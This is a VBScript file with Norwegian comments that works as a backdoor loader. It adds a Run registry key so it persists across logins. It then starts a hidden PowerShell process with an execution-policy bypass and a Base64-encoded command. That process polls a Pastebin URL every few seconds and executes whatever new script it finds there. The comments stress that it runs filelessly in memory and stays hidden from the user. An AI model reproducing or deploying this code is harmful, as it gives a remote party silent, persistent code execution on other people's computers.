Dim shell, targetURL, checkInterval, psCode, encodedCode
Set shell = CreateObject("WScript.Shell")

' ====================================================================
' CONFIGURATION - Endre URL til din råe .ps1-fil (f.eks. Pastebin/GitHub)
' ====================================================================
targetURL = "https://pastebin.com/raw/hVY96d2S"
checkInterval = 5 ' Hvor ofte den sjekker etter oppdateringer (i sekunder)

' ====================================================================
' POWERSHELL BACKEND ENGINE (Kjører 100 % filløst i RAM)
' ====================================================================
' Endring: $l (lastScript) settes nå til det nåværende innholdet på URL-en
' med en gang nettverket er klart. Siden $c (current) vil være lik $l på 
' neste sjekk, hoppes første kjøring over, og den venter på en faktisk oppdatering.
psCode = "$u='" & targetURL & "';$i=" & checkInterval & ";$l='';for($x=0;$x-lt 3;$x++){try{$r=Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 5;if($r.StatusCode -eq 200){$n=$true;break}}catch{Start-Sleep -Sec 10}};if(-not $n){exit};try{$d=$u+'?t='+(Get-Date -UFormat %s);$h=@{'Cache-Control'='no-cache, no-store, must-revalidate';'Pragma'='no-cache'};$r=Invoke-WebRequest -Uri $d -Headers $h -UseBasicParsing;if($r.StatusCode -eq 200){$l=$r.Content}}catch{}while($true){try{$d=$u+'?t='+(Get-Date -UFormat %s);$h=@{'Cache-Control'='no-cache, no-store, must-revalidate';'Pragma'='no-cache'};$r=Invoke-WebRequest -Uri $d -Headers $h -UseBasicParsing;if($r.StatusCode -eq 200){$c=$r.Content;if($c -and $c -ne $l){$l=$c;Start-Job -ScriptBlock ([ScriptBlock]::Create($c))}}}catch{}Start-Sleep -Sec $i}"

' Konverterer oppstartsmotoren til Base64 via den sikre XML-metoden
encodedCode = Base64Encode(psCode)

' ====================================================================
' AUTOMATISK OPPSTART (Registreres i Current User Registry)
' ====================================================================
Dim regPath, scriptPath
regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MyBackgroundReceiver"
scriptPath = WScript.ScriptFullName

On Error Resume Next
shell.RegWrite regPath, "wscript.exe //B " & Chr(34) & scriptPath & Chr(34), "REG_SZ"
On Error GoTo 0

' ====================================================================
' EXECUTION (Garantert 100 % skjult uten vindusblink)
' ====================================================================
shell.Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand " & encodedCode, 0, False

' ====================================================================
' HELPEFUNKSJON: Base64-koding i minnet via rent XML-objekt
' ====================================================================
Function Base64Encode(str)
    Dim xml, elem, dom, node
    Set dom = CreateObject("MSXML2.DOMDocument.3.0")
    Set node = dom.createElement("b64")
    node.dataType = "bin.base64"
    
    Dim bytes
    With CreateObject("MSXML2.DOMDocument.3.0")
        .LoadXML "<root/>"
        .DocumentElement.DataType = "bin.hex"
        
        Dim i, hexStr
        hexStr = ""
        For i = 1 To Len(str)
            Dim c, low, high
            c = AscW(Mid(str, i, 1))
            If c < 0 Then c = c + 65536
            low = Right("0" & Hex(c And 255), 2)
            high = Right("0" & Hex((c \ 256) And 255), 2)
            hexStr = hexStr & low & high
        Next
        
        .DocumentElement.Text = hexStr
        bytes = .DocumentElement.NodeTypedValue
    End With
    
    node.NodeTypedValue = bytes
    Base64Encode = Replace(Replace(node.Text, vbLf, ""), vbCr, "")
End Function
